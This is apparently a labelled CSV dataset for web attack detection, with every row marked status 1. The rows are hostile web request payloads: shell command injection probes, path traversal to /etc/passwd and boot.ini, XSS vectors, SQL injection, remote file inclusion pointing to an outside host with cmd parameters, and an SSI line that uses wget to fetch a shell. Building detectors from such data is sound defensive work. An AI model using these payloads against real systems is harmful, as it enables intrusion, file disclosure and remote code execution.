code,status
 str=$(echo KQPSND),1
& sleep 0 && str=$(echo XBWWVF) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 |,1
/../../../../../../../etc/passwd,1
/cgi-914/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
|echo$IFSZBEWBO$((6+42))$(echo$IFSZBEWBO)ZBEWBO&,1
';echo HYRAZO$((93+48))$(echo HYRAZO)HYRAZO|,1
"/ht8pn8uq.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/colors/jgs_portal_statistik.php?meinaction=themen&month=1&year=1',1
 fi %22,1
">""<>""<script>confirm(2)</script>",1
/.../.../.../.../.../.../.../.../.../windows/win.ini,1
/main.php?stuff=rm;q27761754&rem;,1
 str1=${#str},1
<img/ src//'onerror/''/=confirm(1)//'>,1
/examples/jsp/sessions/index.php?entry=',1
/examples/jsp/cal/sawmillcl.exe?ho+{complete_version},1
"/main.php?stuff=""ping;-w;8000;-n;1;1.2.3.4|rem;",1
/phpmyadmin/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd,1
"/weq93ppb.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
|echo DHCFMD$((19+7))$(echo DHCFMD)DHCFMD,1
/cgi-bin/.cobalt/alert/service.cgi?service=<script>alert('vulnerable')</script>,1
 then sleep 0,1
ORDER BY 29-- ,1
"'||echo$IFSDEQICN$((63+9))$(echo$IFSDEQICN)DEQICN""",1
/examples/jsp/error/yabb.pl?board=news&action=display&num=../../../../../../etc/passwd\x00,1
"/b5xdqgz2.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
<div style=content:url(test2.svg)></div>,1
"/lsoix5h3.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/module/forum/forum.php?fd=http://192.168.202.118:8080/ghl9il?=';,1
/javascript/.htaccess.sfish/'`uname`',1
& sleep 0 && str=$(echo GIKITN) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 //,1
 if [ 1 -ne ${str1} ],1
"/qb2xy9aw.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/error/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
/examples/jsp/error/pfdispaly.cgi?../../../../../../etc/passwd,1
"/8x6w469u.kspx?<script>document.cookie=""testgfjr=1286;""</script>",1
,1
/cgibin/a1stats/a1disp4.cgi?../../../../../../../etc/passwd,1
/scripts/qcvjnagy16kc.cgi,1
"/3hlysl2x.nsf?<meta http-equiv=set-cookie content=""testgjbe=8505"">",1
/bin/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
& sleep 0 && str=$(echo FWEHDM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 ',1
/javascript/agent.exe,1
/subscription-r0/,1
| [ 9 -ne $(echo JLUGPX | tr -d '\n' | wc -c) ] || sleep 1 %22,1
echo $((11+24)),1
 str1=${#str},1
');}print(`echo IMZVGR,1
/quagynka.asp?<script>cross_site_scripting.nasl</script>,1
/0u75ldxq.mscgi?<script>cross_site_scripting.nasl</script>,1
"/edv3mapy.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/help.php?q=ping;-w;10000;-n;1;1.2.3.4|rem;,1
'| [ 7 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,1
& echo KETLTE$((63+93))$(echo KETLTE)KETLTE,1
"/byrg33fw.asp?<meta http-equiv=set-cookie content=""testexuu=5340"">",1
" echo BAJXZZ$((73+7))$(echo BAJXZZ)BAJXZZ""",1
"/main.php?logout=""&del\x09q22899423\x09#",1
/preview.php?php_script_path=http://192.168.202.118:8080/2aibfaczmac8??&cmd=dir,1
 str1=${#str},1
/top.php?stuff=&ver\xa0>q39815136&rem\xa0,1
"/top.php?stuff=""&ver\x0c>q55426988&rem\x0c",1
/0qhcnefz.idc?<script>cross_site_scripting.nasl</script>,1
&#0060;,1
"/examples/jsp/jsp2/el/search/results.stm?indexname=>""><script>foo</script>&style=fancy&spage=60&query=folder name",1
 else sleep 1,1
/script/gestion/index.php?path_inc=http://192.168.202.118:8080/2aibfaczmac8?,1
"/82q7ywa8.php3?<script>document.cookie=""testpwew=1315;""</script>",1
 else sleep 1,1
1'<99# ,1
&&echo$IFSUUESOS$((61+71))$(echo$IFSUUESOS)UUESOS',1
"/help.php?q=""del\x09q75241669&rem\x09",1
/main.php?logout=',1
/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../boot.ini,1
<body onorientationchange=alert(1)>,1
"/main.php?stuff=""ping",1
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=jv05riwb6wrj9cito,1
/top.php?stuff='\x0asleep\x097\x09#,1
echo OSKSTF,1
/..��..��..��..��..��..��..��..��{FILE},1
/scripts/index.php?src=1&_common=1&time=1332009308&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\x00,1
/cgi-bin/fileseek.cgi?foot=&head=;cat /etc/passwd|,1
/cgi-perl/c32web.exe/getimage?imagename=customeremail.txt\x00.pdf,1
"/main.php?stuff=""del\x0cq36356367&rem\x0c",1
"<img src onerror /"" '""= alt=alert(1)//"">",1
/inc/ifunctions.php?GLOBALS[phpQRootDir]=XXpathXX,1
"/pxagj7n7.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/dslpwt15.do?<script>document.cookie=""testtkio=5454;""</script>",1
" fi """,1
/upload/admin/frontpage_right.php?loadadminpage=XXpathXX?,1
<svg[U+000B]onload=alert(1)>,1
/en-us/account/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ifl_y2qb]));die;/*,1
/main.php?logout=del;q21667624&rem;,1
/javascript/.passwd.java,1
/starnet/addons/slideshow_full.php?album_name='1914539941,1
//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(4)//>\x3e,1
ftp://192.168.25.103/*<apache_mod_proxy_ftp_glob_xss.nasl>,1
/help.php?q=&ver >q99146784&rem ,1
/javascript/del.exe,1
${shell_exec(print(`echo CVXUUB\necho $((15+41))\necho CVXUUB\necho CVXUUB`);//CVXUUB,1
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",1
" echo EJENVL$((99+67))$(echo EJENVL)EJENVL//
;echo$IFSOYDJLD$((49+19))$(echo$IFSOYDJLD)OYDJLD//",1
/scriptheader/,1
/libsecure.php?abs_path=XXpathXX?,1
"/iv5vkgam.cfm?<meta http-equiv=set-cookie content=""testfosd=94"">",1
 else sleep 1,1
"/top.php?stuff=""sleep\x098\x09#",1
/manager/sawmill6cl.exe?ho+{complete_version},1
/examples/jsp/colors/whois.cgi?action=load&whois=;id,1
<anything onbeforescriptexecute=confirm(1)>,1
/..%2f..%2f{FILE},1
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",1
/examples/jsp/jsp2/jspx/insertorder.cfm?cfid=1&cftoken=1 union select 1,1
 str=$(echo IRXTAA),1
/m5103snj.nsf?<script>cross_site_scripting.nasl</script>,1
/decoder/gallery.php?ccms_library_path=XXpathXX,1
/recordings/sql.php?lib_inc=1&btndrop=no&goto=/etc/passwd,1
${popen(print(`echo VGNVLG`.`echo $((76+39))`.`echo VGNVLG`.`echo VGNVLG`);VGNVLG,1
/javascript/.passwd.jar,1
/87_ben dover's cheek mates/,1
"<svg xmlns=""http://www.w3.org/2000/svg""><a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""javascript:alert(1)""><rect width=""1000"" height=""1000"" fill=""white""/></a></svg>",1
echo SGYETR$((24+19))$(echo SGYETR)SGYETR|,1
<svg><style>&ltimg src=x onerror=confirm(1)&gt</svg>,1
 str=$(echo SYNSAC),1
| [ 8 -ne $(echo AWKJGV | tr -d '\n' | wc -c) ] || sleep 1 ,1
><body onload=javascript:alert(1)>,1
/examples/jsp/colors/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1,1
 else sleep 1,1
"/eg2u8pbv.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/checkbox/config.php?returnpath=/etc/passwd\x00,1
/examples/jsp/error/smpwservicescgi.exe,1
/javascript/htpasswd.jar,1
&#X003c,1
/javascript/demo.exe,1
"/top.php?stuff=""&ping\xa0-w\xa011000\xa0-n\xa01\xa01.2.3.4&rem\xa0",1
 if [ 7 -ne ${str1} ],1
/top.php?stuff=;rm\x09q22474851\x09#,1
/6wb70v0b.cfc?<script>cross_site_scripting.nasl</script>,1
%22& sleep 0 && str=$(echo EZDZJG) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #,1
";echo EQXSGK$((86+0))$(echo EQXSGK)EQXSGK&
&echo RWYPHC$((46+28))$(echo RWYPHC)RWYPHC&",1
"/downloads/pafiledb.php?action=rate&id=4?\""&lt;script&gt;alert('vulnerable')&lt;/script&gt;\""",1
"/help.php?q=""&rm",1
 if [ 7 -ne ${str1} ],1
"/edv3mapy.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/sdk/../../../../../../../etc/vmware/hostd/vminventory.xml,1
 if [ 4 -ne ${str1} ],1
 echo LCFCBB$((47+22))$(echo LCFCBB)LCFCBB\\,1
',1
"/top.php?stuff=""\x0auname >q36232773 #",1
"/quagynka.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
| [ 6 -ne $(echo RZSNER | tr -d '\n' | wc -c) ] || sleep 1 %22,1
echo OUPQQD$((2+0))$(echo OUPQQD)OUPQQD&,1
"<label class=""<% confirm(1) %>"">",1
"<a target=_blank href=""data:text/html",1
"&echo WHBQCR$((5+15))$(echo WHBQCR)WHBQCR'
&&echo NUMBRK$((29+87))$(echo NUMBRK)NUMBRK'",1
; str=$(echo OXFDXC); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,1
/backupscript/,1
 else sleep 1,1
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",1
"<IMG SRC=""livescript:[code]"">",1
/components/com_mospray/scripts/admin.php?basedir=http://192.168.202.118:8080/moclyxlwqyfjnp??&cmd=id,1
"/help.php?q=""&del\x09q44432678\x09#",1
/examples/jsp/jsp2/el/kb.cgi?view='&lang=en,1
 echo HNHGPN$((18+32))$(echo HNHGPN)HNHGPN\,1
/help.php?q=&uname >q88293785 #,1
</feImage>,1
"/zmvq66jy.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi-915/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go,1
 then sleep 0,1
/javascript/compact.exe,1
<a/href=data&colon;text/html;&Tab;base64&Tab;,1
"/en-us/33y9gcqq.php?<script>document.cookie=""testnvxc=4301;""</script>",1
"/jw64yq8u.x?<script>document.cookie=""testylfu=1313;""</script>",1
 then sleep 0,1
/igtf0zon.cfc?<script>cross_site_scripting.nasl</script>,1
/admin/comment.php?config[installdir]=XXpathXX,1
"/main.php?stuff=""&rm\xa0q39243847&rem\xa0",1
&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;,1
"/rbec2ohx.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
&&echo FOJNEL$((64+8))$(echo FOJNEL)FOJNEL,1
/././././././../../../../../etc/passwd,1
/administrator/components/com_feederator/includes/tmsp/subscription.php?globals[mosconfig_absolute_path]=http://192.168.202.96:8080/txenjrxf3?,1
"<meta http-equiv=set-cookie content=""testsbvw=6289"">",1
/scgi-bin/fileseek2.cgi?foot=;cat /etc/passwd&head=,1
"%27& sleep 0 && str=$(echo FKFULK) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 """,1
/admin/news.admin.php?path_to_script=http://192.168.202.118:8080/tzhfyzkbomspvm??&cmd=ls,1
ORDER BY 16 ,1
/doc/index.php?s=/etc/passwd\x00,1
"/fa8p8lr8.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/sleuthscript1/,1
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+555+/tmp/rymojltfjq0;'); function v,1
+if(benchmark(3000000,1
 str1=${#str},1
/scripts/zq9frlz6fcfp.inc,1
/examples/jsp/jsp2/jspx/docs/index.php?lang=/../../../../../../../../../../etc/passwd\x00,1
"<div id=""87""><svg xmlns=""http://www.w3.org/2000/svg"">",1
&echo UQBVZS$((49+88))$(echo UQBVZS)UQBVZS\,1
/pbserver/..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/en-us/odzk29aa.jspa?<meta http-equiv=set-cookie content=""testtfvh=2141"">",1
/javascript/id.exe,1
"<!--#exec cmd=""wget http://website.com/dir/shell.txt"" -->",1
/scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1313328975--,1
/scripts/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/weq93ppb.x?<script>cross_site_scripting.nasl</script>,1
 if [ 3 -ne ${str1} ],1
"/xsqln7eb.htm?<meta http-equiv=set-cookie content=""testpcbb=9254"">",1
"/popup.php?poll_ident=<script>alert(""wvs-xss-magic-string-411445575285"")</script>",1
 fi %2F%2F,1
/<4429ea00/,1
" fi """,1
/en-us/n9xlumt5.cfm?<script>cross_site_scripting.nasl</script>,1
/..%2f{FILE},1
/scripts/index.php?src=1&_common=1&time=1331919221&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\x00,1
/ows-bin/oaskill.exe?abcde.exe,1
/en-us/account/pollit/poll_it_ssi_v2.0.cgi?data_dir=/etc/passwd\x00,1
&&echo RIWFAA$((64+99))$(echo RIWFAA)RIWFAA//,1
/scripts/mini_logger.cgi,1
; str=$(echo VHBJGH); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,1
/boorp's/,1
<form><button formaction=javascript:alert(1)>click ,1
 str1=${#str},1
"&echo$IFSJNESPQ$((88+93))$(echo$IFSJNESPQ)JNESPQ'
&&echo$IFSTXPRBJ$((40+83))$(echo$IFSTXPRBJ)TXPRBJ'",1
/scripts/event_view.php?eid=34 union select 1183395596,1
/cgi-bin/help/index.php?help_file=../../../../../../../../../../../etc/passwd,1
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},1
x' AND 1=(SELECT COUNT(*) FROM tabname);--,1
"|echo$IFSNNKINL$((7+56))$(echo$IFSNNKINL)NNKINL&
||echo$IFSACDZIF$((7+56))$(echo$IFSACDZIF)ACDZIF&",1
/examples/jsp/error/index.php?id=urjhxcl19w',1
 str1=${#str},1
"<?xml-stylesheet type=""text/css""?><root style=""x:expression(write(1))""/>",1
 if [ 4 -ne ${str1} ],1
"<div id=""39""><!-- up to Opera 11.52",1
"/if69ddo1.x?<script>document.cookie=""testiabz=5220;""</script>",1
"/scs86g1p.idc?<meta http-equiv=set-cookie content=""testquyx=2820"">",1
 if [ 3 -ne ${str1} ],1
/javascript/galleries.exe,1
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,1
/%2e%2e\%2e%2e\{FILE},1
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",1
"<img\x11src=x onerror=""javascript:alert(1)"">",1
"/help.php?q=""&uname >q11415113 #",1
"/main.php?stuff=""ping;-w;9000;-n;1;4.3.2.1&rem;",1
/examples/jsp/colors/sgdynamo.exe?htname=<script>foo</script>,1
/webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('vulnerable')</script>,1
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",1
'+if(benchmark(3000000,1
/eyscript/,1
"/scs86g1p.idc?<script>document.cookie=""testquyx=2820;""</script>",1
echo$IFSFQSEMN$((91+33))$(echo$IFSFQSEMN)FQSEMN&,1
/xlaapmview.asp?p=2&msg=<script>alert($random)</script>,1
/supasite/admin_utilities.php?supa[db_path]=XXpathXX,1
"/cgi-bin/login.php?user=""><script>alert('pubcookie_xss.nasl');</script>",1
"/u95h6ymu.asp?<script>document.cookie=""testkhwc=4028;""</script>",1
/b16_sos children's support worker/,1
/examples/jsp/jsp2/el/mapserv.exe?map=mapserver_detect.nasl.map,1
"/ddoworrl.cfc?<script>document.cookie=""testvlau=8517;""</script>",1
/subscriptions.nsf,1
/iktok2bw.php?<script>cross_site_scripting.nasl</script>,1
%22; str=$(echo USUNJP); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,1
/inc/shows.inc.php?cutepath=XXpathXX?,1
/recordings/index.php?id=',1
&#x003C;,1
')print(`echo EHVUCK;echo $((3+47));echo EHVUCK;echo EHVUCK`);.%27EHVUCK,1
 fi %2F%2F,1
/pbserver/..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/h4bi26jd.aspx?<script>document.cookie=""testhrzx=1150;""</script>",1
"/eg2u8pbv.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 fi %26,1
/examples/jsp/jsp2/jspx/index.php?id='union/**/select/**/0,1
/recordings/php.cgi?/etc/passwd,1
 and 0=benchmark(3000000,1
/phpmyadmin/themes/original/img/s_passwd.png,1
/protection.php?action=logout&siteurl=../../../../../../../../../../boot.ini\x00,1
//.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\etc/passwd,1
/scripts/bveygnpo6hkw.cgi,1
 then sleep 0,1
/scripts/500page.jsp,1
/scripts/base_qry_common.php?base_path=/etc/passwd\x00,1
/ncaster/admin/addons/archive/archive.php?adminfolder=XXpathXX,1
/manager/admin/configset.php?settings_dir=/etc/passwd\x00,1
/%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},1
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=q68315591&frm_user=&scr_height=&scr_width=,1
')) and 0=benchmark(3000000,1
%27; str=$(echo BVJEPJ); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,1
"&echo DKZRJM$((95+2))$(echo DKZRJM)DKZRJM|
&&echo AQMHPO$((37+73))$(echo AQMHPO)AQMHPO|",1
/manager/pfdispaly.cgi?../../../../../../etc/passwd,1
/kernel/loadkernel.php?installpath=/etc/passwd\x00,1
/scripts/9pen4xzgztjn.cfm,1
/servlet/org.apache.catalina.context/<script>alert('vulnerable')</script>,1
"/6wb70v0b.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/9ko6m4c8.html?<meta http-equiv=set-cookie content=""testylik=3403"">",1
"/top.php?stuff=""\x0dsleep\x099\x09#",1
' or 'x'='x,1
"/aj3pf49c.do?<script>document.cookie=""testnofv=4170;""</script>",1
<svg><doh onload=confirm(1)>,1
"/main.php?logout=""&ping",1
"`= + >;test<a""'",1
/scripts/..5c2e./winnt/system32/cmd.exe?/x+/c+copy \winnt\system32\cmd.exe ck8pj.exe,1
"/top.php?stuff=""&ping;-w;9000;-n;1;1.2.3.4&rem;",1
 str=$(echo JLLXMB),1
/examples/jsp/num/cgiip.exe/wservice=wsbroker1/webutil/ping.p,1
"
 str=$(echo VDEVWJ)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F
",1
/scripts/lib/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
"/1qwv2p5p.htm?<meta http-equiv=set-cookie content=""testvqcy=252"">",1
"/1r8cfrlf.asp?<script>document.cookie=""testydan=5106;""</script>",1
"/azcrfs8d.do?<script>document.cookie=""testjpdr=9205;""</script>",1
"/if69ddo1.idc?<meta http-equiv=set-cookie content=""testiabz=5220"">",1
&#X003E,1
[<script>]=*confirm(1)</script>,1
/javascript/employment.exe,1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
/bin/testcgi.exe,1
/interface/editors/custom.php?bField[bf_data]=XXpathXX,1
/product-description/,1
"/xlj7h65o.asp?<meta http-equiv=set-cookie content=""testtbbe=856"">",1
"/um7xpn15.kspx?<meta http-equiv=set-cookie content=""testotoy=6142"">",1
"/en-us/i686v90l.x?<meta http-equiv=set-cookie content=""testfutf=1550"">",1
| [ 6 -ne $(echo MCLZRV | tr -d '\n' | wc -c) ] || sleep 1 %7C,1
/./\/./{FILE},1
"/ju0u7kfo.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/mobile.exe,1
/javascript/email.exe,1
/examples/servlets/servlet/cart32.exe,1
"/xlj7h65o.idc?<meta http-equiv=set-cookie content=""testtbbe=856"">",1
<SCR,1
&#X03C,1
/javascript/javascript.exe,1
"/main.php?stuff=""&ver&rem;",1
/index.php?src=1&_common=1&time=1332010405&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\x00,1
/javascript/document.mdb,1
"/examples/jsp/error/?""><script>alert('struts_sa_surl_xss.nasl')</script>",1
/default.asp?catid=1234567890',1
"/search.jsp?q=%""<script>alert(1331905049)</script>",1
/cacti/shopper.cgi?newpage=../../../../../../etc/passwd,1
 then sleep 0,1
| [ 5 -ne $(echo SKWMFK | tr -d '\n' | wc -c) ] || sleep 1 %26,1
%22& sleep 0 && str=$(echo NDPSSM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %27,1
||echo$IFSKJHMXN$((3+73))$(echo$IFSKJHMXN)KJHMXN,1
"/hjdzm96v.asp?<meta http-equiv=set-cookie content=""testbyqe=7474"">",1
||echo$IFSBVFYIU$((58+91))$(echo$IFSBVFYIU)BVFYIU|,1
"/readmore.php?config[""sipssys""]=http://192.168.202.96:8080/4dckqcc0acprbz?",1
/antispam/listdel?file=whitelist&name=a<script>alert('vulnerable')</script>&startline=0(naturally),1
/examples/jsp/jsp2/jspx/faq.php?action=&type=view&s=&id=-1' union select 0,1
 if [ 2 -ne ${str1} ],1
JavaSCript:alert(123),1
"/ghswfouu.pl?<meta http-equiv=set-cookie content=""testsqmm=5713"">",1
/javascript/index_1.exe,1
"/main.php?stuff=""ping\x0c-w\x0c8000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c",1
/examples/jsp/jsp2/el/apps/pbcs.dll/misc?url=../../../../../../../../../../../../boot.ini,1
"/main.php?stuff=""del q63222197&rem ",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;rm+/tmp/lknajdyaas""",1
' OR '1'='1' ,1
/help.php?q=&ver\xa0>q85836551&rem\xa0,1
 fi ',1
/javascript/funcs.exe,1
<script\x2F>javascript:alert(1)</script>,1
/bin/gwweb.exe?help=bad-request,1
/w-agora_path/reorder_forums.php?bn_dir_default=XXpathXX?,1
/e9rx3ya4.nsf?<script>cross_site_scripting.nasl</script>,1
"/en-us/odzk29aa.idc?<meta http-equiv=set-cookie content=""testtfvh=2141"">",1
/javascript/repl.exe,1
"/jdx255ea.fts?<script>document.cookie=""testziyq=5055;""</script>",1
"/main.php?logout=""&ping\x0b-w\x0b8000\x0b-n\x0b1\x0b4.3.2.1&rem\x0b",1
 then sleep 0,1
"/vmi8bb12.php?<script>document.cookie=""testlerc=2575;""</script>",1
 str=$(echo BHVRST),1
/scripts/lpzj75ztw9lb.sh,1
<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>,1
.../../../../../../../../../../etc/passwd,1
/sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>,1
/ju0u7kfo.mscgi?<script>cross_site_scripting.nasl</script>,1
 if [ 2 -ne ${str1} ],1
 str=$(echo RCSPMW),1
"<img \x00src=x onerror=""javascript:alert(1)"">",1
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",1
/help.php?q='\x0auname\x09>q47355772\x09#,1
"<script> document.getElementById(""safe123"").click=function()+{confirm(Safe.get());} document.getElementById(""safe123"").click({'type':'click'",1
echo$IFSTCNIRU$((23+88))$(echo$IFSTCNIRU)TCNIRU|,1
/themes/ubb/login.php?theme=XXpathXX,1
 then sleep 0,1
/javascript/vfs.exe,1
"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=""xhr=new XMLHttpRequest();xhr.open('GET'",1
 str1=${#str},1
&#X00003C,1
 else sleep 1,1
/examples/servlets/servlet/config.php?path[docroot]=/etc/passwd\x00,1
/..\..\..\..\..\{FILE},1
 str1=${#str},1
/examples/jsp/num/supporter/tupdate.php?groupid=change&sg=',1
"<script> document.getElementById(""safe123"").click=function()+{confirm(Safe.get());} document.getElementById(""safe123"").click({'type':'click'",1
 then sleep 0,1
"/b1q8bywu.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/ny1b3qq4.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 then sleep 0,1
/examples/servlets/servlet/index.php?id='union/**/select/**/0,1
/esupport/admin/autoclose.php?subd=XXpathXX?,1
/opensiteadmin/scripts/classes/filter.php?path=http://192.168.202.118:8080/2aibfaczmac8?\x00,1
